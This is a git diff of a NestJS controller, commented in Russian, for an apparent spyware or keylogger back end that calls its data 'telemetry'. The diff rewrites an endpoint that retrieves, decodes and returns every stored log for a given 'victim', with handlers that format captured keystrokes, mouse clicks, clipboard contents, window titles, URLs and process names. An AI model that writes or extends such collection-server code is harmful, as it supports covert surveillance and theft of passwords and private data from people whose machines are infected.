@@ -14,9 +14,15 @@ import { TelemetryService } from './telemetry.service';
 import { TelemetryAuthService } from './telemetry-auth.service';
 import { InitTelemetryDto } from './dto/init-telemetry.dto';
 import { TelemetryDataDto } from './dto/telemetry-data.dto';
+import { TelemetryBodyDto } from './dto/telemetry-body.dto';
 import { TelemetryExceptionFilter } from './filters/telemetry-exception.filter';
 import { ConfigService } from '@nestjs/config';
 import { Client } from 'pg';
+import {
+  DecryptedTelemetryData,
+  TelemetryLogResponse,
+  VictimInfo,
+} from './entities/telemetry.entity';
 
 @Controller('api')
 @UseFilters(TelemetryExceptionFilter)
@@ -257,7 +263,7 @@ export class TelemetryController {
   // }
 
   @Post('v1/telemetry')
-  async receiveTelemetry(@Body() body: any, @Req() req: Request) {
+  async receiveTelemetry(@Body() body: TelemetryBodyDto, @Req() req: Request) {
     console.log('=== TELEMETRY ENDPOINT HIT ===');
     console.log('IP:', req.ip);
     console.log('User-Agent:', req.headers['user-agent']);
@@ -604,106 +610,273 @@ CREATE INDEX IF NOT EXISTS idx_telemetry_logs_received_at ON telemetry_logs(rece
 
   @Get('v1/victim/:clientId/logs')
   async getVictimLogs(@Param('clientId') clientId: string) {
-    console.log('=== getVictimLogs START ===');
-    console.log('clientId:', clientId);
-    console.log('clientId type:', typeof clientId);
-    console.log('clientId length:', clientId?.length);
-    
-    // Валидация clientId
-    if (!clientId || clientId.trim().length === 0) {
-      console.log('❌ ERROR: Empty clientId');
-      return {
-        success: false,
-        error: 'Invalid client_id',
-        client_id: clientId,
-        logs: [],
-        count: 0,
-      };
-    }
-    
-    const db = new Client({
-      connectionString: process.env.DATABASE_URL,
-      ssl: { rejectUnauthorized: false },
-    });
-
-    try {
-      await db.connect();
-      console.log('✅ Database connected for getVictimLogs');
+      console.log('=== getVictimLogs START (FULL DATA) ===');
       
-      // Проверяем существование таблицы
-      const tableCheck = await db.query(`
-        SELECT EXISTS (
-          SELECT FROM information_schema.tables 
-          WHERE table_schema = 'public' 
-          AND table_name = 'telemetry_logs'
-        );
-      `);
-      
-      if (!tableCheck.rows[0]?.exists) {
-        console.log('⚠️ Table telemetry_logs does not exist');
-        return {
-          success: true,
-          client_id: clientId,
-          logs: [],
-          count: 0,
-          message: 'Table telemetry_logs does not exist yet',
-        };
-      }
-      
-      console.log('✅ Table telemetry_logs exists, executing query...');
-      
-      const result = await db.query(`
-        SELECT 
-          id,
-          client_id,
-          timestamp,
-          payload_size,
-          received_at
-        FROM telemetry_logs
-        WHERE client_id = $1
-        ORDER BY received_at DESC
-        LIMIT 100
-      `, [clientId]);
-      
-      console.log(`✅ Found ${result.rows.length} logs for client ${clientId}`);
-      
-      return {
-        success: true,
-        client_id: clientId,
-        logs: result.rows.map(log => ({
-          id: log.id,
-          client_id: log.client_id,
-          timestamp: log.timestamp,
-          payload_size: log.payload_size,
-          data_type: 'encrypted',
-          received_at: log.received_at,
-          decrypted_data: {}
-        })),
-        count: result.rows.length,
-      };
-    } catch (error) {
-      console.error('❌ ERROR in getVictimLogs:', error);
-      console.error('Error name:', error.name);
-      console.error('Error message:', error.message);
-      console.error('Error code:', error.code);
-      console.error('Error detail:', error.detail);
-      console.error('Error stack:', error.stack);
-      
-      // Возвращаем ошибку в правильном формате
-      return {
-        success: false,
-        error: error.message || 'Internal server error',
-        client_id: clientId,
-        logs: [],
-        count: 0,
-      };
-    } finally {
+      const db = new Client({
+          connectionString: process.env.DATABASE_URL,
+          ssl: { rejectUnauthorized: false },
+      });
+  
       try {
-        await db.end();
-        console.log('✅ Database connection closed');
-      } catch (closeError) {
-        console.error('⚠️ Error closing database connection:', closeError.message);
+          await db.connect();
+          console.log('✅ Database connected for getVictimLogs');
+          
+          // 1. Получаем ВСЕ логи БЕЗ ограничений
+          const logsResult = await db.query(`
+              SELECT 
+                  id,
+                  client_id,
+                  timestamp,
+                  encrypted_payload,
+                  payload_size,
+                  received_at
+              FROM telemetry_logs
+              WHERE client_id = $1
+              ORDER BY received_at DESC
+          `, [clientId]);
+          
+          console.log(`✅ Found ${logsResult.rows.length} COMPLETE logs for client ${clientId}`);
+          
+          // 2. Полностью расшифровываем КАЖДЫЙ лог
+          const decryptedLogs: TelemetryLogResponse[] = [];
+          
+          for (const [index, log] of logsResult.rows.entries()) {
+              try {
+                  console.log(`\n=== Processing log ${index + 1}/${logsResult.rows.length} ===`);
+                  console.log(`Log ID: ${log.id}`);
+                  console.log(`Payload size: ${log.payload_size} bytes`);
+                  
+                  let fullDecryptedData: DecryptedTelemetryData | null = null;
+                  let dataType = 'unknown';
+                  let originalData: string | null = null;
+                  
+                  if (log.encrypted_payload && log.encrypted_payload.length > 0) {
+                      // Сохраняем оригинальные байты
+                      const originalBytes = log.encrypted_payload;
+                      
+                      // 1. Пытаемся как UTF-8 строку
+                      try {
+                          const asUtf8 = originalBytes.toString('utf8');
+                          console.log(`UTF-8 length: ${asUtf8.length} chars`);
+                          
+                          // 2. Пытаемся распарсить как JSON (может быть уже JSON)
+                          try {
+                              const parsedJson = JSON.parse(asUtf8);
+                              fullDecryptedData = parsedJson;
+                              dataType = parsedJson.type || 'json';
+                              originalData = parsedJson.data;
+                              console.log(`✅ Parsed as JSON, type: ${dataType}`);
+                          } catch (jsonError) {
+                              // 3. Если не JSON, пробуем base64 декодирование
+                              try {
+                                  const base64Decoded = Buffer.from(asUtf8, 'base64').toString('utf8');
+                                  console.log(`Base64 decoded length: ${base64Decoded.length} chars`);
+                                  
+                                  const parsedBase64 = JSON.parse(base64Decoded);
+                                  fullDecryptedData = parsedBase64;
+                                  dataType = parsedBase64.type || 'base64-json';
+                                  originalData = parsedBase64.data;
+                                  console.log(`✅ Parsed as Base64->JSON, type: ${dataType}`);
+                              } catch (base64Error) {
+                                  // 4. Если ничего не работает, сохраняем всё что есть
+                                  fullDecryptedData = {
+                                      raw_utf8: asUtf8,
+                                      raw_hex: originalBytes.toString('hex').substring(0, 200) + '...',
+                                      original_length: originalBytes.length,
+                                      error: 'Could not parse as JSON or Base64'
+                                  };
+                                  dataType = 'raw';
+                                  originalData = asUtf8.substring(0, 500);
+                                  console.log(`⚠️ Could not parse, saving as raw`);
+                              }
+                          }
+                      } catch (utf8Error) {
+                          // Если не UTF-8, сохраняем как hex
+                          fullDecryptedData = {
+                              raw_hex: originalBytes.toString('hex'),
+                              original_length: originalBytes.length,
+                              error: 'Not UTF-8 encoded'
+                          };
+                          dataType = 'binary';
+                          originalData = `Binary data (${originalBytes.length} bytes)`;
+                          console.log(`⚠️ Not UTF-8, saving as binary`);
+                      }
+                  } else {
+                      fullDecryptedData = { error: 'Empty payload' };
+                      dataType = 'empty';
+                      originalData = null;
+                      console.log(`⚠️ Empty payload`);
+                  }
+                  
+                  // Убеждаемся, что fullDecryptedData не null
+                  if (!fullDecryptedData) {
+                      fullDecryptedData = { error: 'Unknown error during decryption' };
+                  }
+                  
+                  // Формируем ПОЛНЫЙ объект лога
+                  const completeLog: TelemetryLogResponse = {
+                      // Основная информация
+                      id: log.id,
+                      client_id: log.client_id,
+                      timestamp: log.timestamp,
+                      received_at: log.received_at,
+                      payload_size: log.payload_size,
+                      
+                      // Тип данных
+                      data_type: dataType,
+                      encrypted: false, // Уже расшифровано
+                      
+                      // ПОЛНЫЕ данные (ВСЁ что есть)
+                      full_decrypted_data: fullDecryptedData,
+                      
+                      // Оригинальные данные для отображения
+                      original_data: originalData,
+                      
+                      // Victim info из данных (если есть)
+                      victim_info: (fullDecryptedData && 'victim_info' in fullDecryptedData && fullDecryptedData.victim_info) ||
+                                  (fullDecryptedData && 'server_data' in fullDecryptedData && fullDecryptedData.server_data?.victim_info) ||
+                                  ({} as VictimInfo),
+                      
+                      // Для удобства фронтенда - основные поля
+                      display_data: this.extractDisplayData(fullDecryptedData, dataType),
+                      
+                      // Техническая информация
+                      technical_info: {
+                          has_payload: !!log.encrypted_payload,
+                          payload_length: log.encrypted_payload?.length || 0,
+                          processing_success: true,
+                          processed_at: new Date().toISOString()
+                      }
+                  };
+                  
+                  decryptedLogs.push(completeLog);
+                  console.log(`✅ Log ${index + 1} processed successfully`);
+                  
+              } catch (error) {
+                  console.error(`❌ CRITICAL ERROR processing log ${log.id}:`, error);
+                  console.error('Error stack:', error.stack);
+                  
+                  // Даже при ошибке возвращаем ВСЮ доступную информацию
+                  const errorLog: TelemetryLogResponse = {
+                      id: log.id,
+                      client_id: log.client_id,
+                      timestamp: log.timestamp,
+                      received_at: log.received_at,
+                      payload_size: log.payload_size,
+                      data_type: 'error',
+                      encrypted: true,
+                      full_decrypted_data: {
+                          error: error.message,
+                          error_stack: error.stack,
+                          raw_payload_available: !!log.encrypted_payload,
+                          raw_payload_length: log.encrypted_payload?.length || 0
+                      },
+                      original_data: `ERROR: ${error.message}`,
+                      victim_info: {} as VictimInfo,
+                      display_data: `Processing error: ${error.message}`,
+                      technical_info: {
+                          has_payload: !!log.encrypted_payload,
+                          payload_length: log.encrypted_payload?.length || 0,
+                          processing_success: false,
+                          error: error.message
+                      }
+                  };
+                  
+                  decryptedLogs.push(errorLog);
+              }
+          }
+          
+          console.log(`\n=== FINAL RESULT ===`);
+          console.log(`Total logs: ${decryptedLogs.length}`);
+          console.log(`Sample of first log:`, JSON.stringify(decryptedLogs[0]?.full_decrypted_data, null, 2));
+          
+          // Возвращаем ВСЁ
+          return {
+              success: true,
+              client_id: clientId,
+              logs: decryptedLogs, // ВСЕ логи полностью
+              count: decryptedLogs.length,
+              metadata: {
+                  total_bytes: decryptedLogs.reduce((sum, log) => sum + (log.payload_size || 0), 0),
+                  types_count: this.countDataTypes(decryptedLogs),
+                  processed_at: new Date().toISOString(),
+                  server_version: '1.0-full-data'
+              }
+          };
+          
+      } catch (error) {
+          console.error('❌ FATAL ERROR in getVictimLogs:', error.message);
+          console.error('Error stack:', error.stack);
+          
+          return {
+              success: false,
+              error: error.message,
+              error_details: error.stack,
+              client_id: clientId,
+              logs: [],
+              count: 0,
+              metadata: {
+                  error: true,
+                  message: 'Server error',
+                  timestamp: new Date().toISOString()
+              }
+          };
+      } finally {
+          try {
+              await db.end();
+              console.log('✅ Database connection closed');
+          } catch (closeError) {
+              console.error('⚠️ Error closing database:', closeError.message);
+          }
       }
-    }
+  }
+  
+  // Вспомогательные методы
+  private extractDisplayData(
+      fullData: DecryptedTelemetryData | null,
+      dataType: string,
+  ): any {
+      if (!fullData) return null;
+      
+      // Проверяем, что это не объект с ошибкой
+      if ('error' in fullData && !('data' in fullData)) {
+          return null;
+      }
+      
+      switch (dataType) {
+          case 'keystrokes':
+              return ('data' in fullData && fullData.data) ||
+                     ('keystrokes' in fullData && fullData.keystrokes) ||
+                     fullData;
+          case 'mouse':
+              return ('data' in fullData && fullData.data) ||
+                     ('clicks' in fullData && fullData.clicks) ||
+                     fullData;
+          case 'clipboard':
+              return ('data' in fullData && fullData.data) ||
+                     ('content' in fullData && fullData.content) ||
+                     fullData;
+          case 'window':
+              return ('data' in fullData && fullData.data) || {
+                  title: ('title' in fullData ? fullData.title : undefined),
+                  process: ('process' in fullData ? fullData.process : undefined),
+                  url: ('url' in fullData ? fullData.url : undefined),
+              };
+          case 'process':
+              return ('data' in fullData && fullData.data) ||
+                     ('name' in fullData && fullData.name) ||
+                     fullData;
+          default:
+              return ('data' in fullData && fullData.data) || fullData;
+      }
+  }
+  
+  private countDataTypes(logs: TelemetryLogResponse[]): Record<string, number> {
+      const counts: Record<string, number> = {};
+      logs.forEach(log => {
+          const type = log.data_type || 'unknown';
+          counts[type] = (counts[type] || 0) + 1;
+      });
+      return counts;
   }
 }
